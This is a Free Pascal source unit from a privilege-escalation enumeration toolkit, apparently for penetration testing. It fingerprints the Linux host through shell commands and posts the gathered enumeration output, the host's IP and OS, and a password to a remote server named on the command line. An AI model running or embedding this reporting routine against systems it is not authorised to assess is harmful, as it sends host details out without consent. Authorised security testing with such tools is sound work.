{

this unit is part of mongoose privielge escalation enumeration toolkit , all these exploits are being
disclosed and publicly available on exploit-db or different known security sources .

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

@author : Lawrence Amer
@email : security@secploit.com
@zux0x3a

###  Environment
Lazarus 1.8 or above
FPC 3.0.4
}

unit core;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils,process,fphttpclient,base64;


function sysname:string;
function getsysip:string;
function PostRequest(postdata:wideString;ip:string;sys:string;cat:string):String;
function RandomString:String;

implementation



function sysname:string;
var
  cd,checksysv: string;
   gentoo,deb,ubu,bsd,npm :integer;
  begin
  cd := 'cat /proc/version';
  RunCommand('/bin/bash',['-c',cd],checksysv);

     gentoo :=pos('gentoo',checksysv);
     deb := pos('debian',checksysv);
     ubu := pos('ubuntu',checksysv);
     bsd :=  pos('bsd',checksysv);
     npm :=  pos('cent',checksysv);

    if (gentoo > 0 ) then
     begin
     result := 'Gentoo';
      end else if (deb > 0 ) then
       begin
     result := 'Debian';
       end else if (ubu > 0)  then begin
     result := 'Ubuntu';
       end else if (bsd > 0) then begin
     result := 'BSD';
       end else if (npm > 0)  then begin
     result := 'CentOS';
       end;
  end;

function getsysip:string;
var
  cmd,outp:string;

begin
  cmd := 'ip route get 1.2.3.4 | awk ''{print $7}''';
  RunCommand('/bin/bash',['-c',cmd],outp);
  result :=outp;

end;
function RandomString:String;
var
ip,os,res,d:String;

begin
  ip:=getsysip;
  os:=sysname;
  d :=  datetimetostr(date);
   res := ip+os+d;
  result :=EncodeStringBase64(res);
end;
function PostRequest(postdata:wideString;ip:string;sys:string;cat:string):String;
var
  FPHTTPClient: TFPHTTPClient;
  ResultPost, payload,header: String;
  pass,host,uid:string;
  i:integer;
  rep:boolean;
Begin
  // uid := randomstring(10);
  rep := false;
  uid := randomstring;
  //to get ip addres for all systems : ip route get 1.2.3.4 | awk '{print $7}'

  for i := 1 to paramcount do begin

      if(paramstr(i)='-o') then begin
          writeln('[+] Found Result has been sent to :: ',paramstr(i+1));   //here we can add host as CONST
          host :=paramstr(i+1);
          rep := true;
      end;
     if (paramstr(i)='-x') then begin

          pass := paramstr(i+1);

     end;

   end;
payload := 'username=admin&password='+pass+'&output='+'<pre>'+postdata+'</pre>'+'&category='+cat+'&host='+ip+'&sys='+sys+'&random_string='+uid;

if (rep = true) then begin
FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
FPHTTPClient.AddHeader('key','test');
   try
      ResultPost := FPHTTPClient.formpost('http://'+host+'/0xsp/api/Postreq', payload); // test URL, real one is HTTPS
      PostRequest := ResultPost;
      writeln(postrequest);
   except
      on E: exception do
         writeln(E.Message);
   end;
FPHTTPClient.Free;
end;
end;
end.

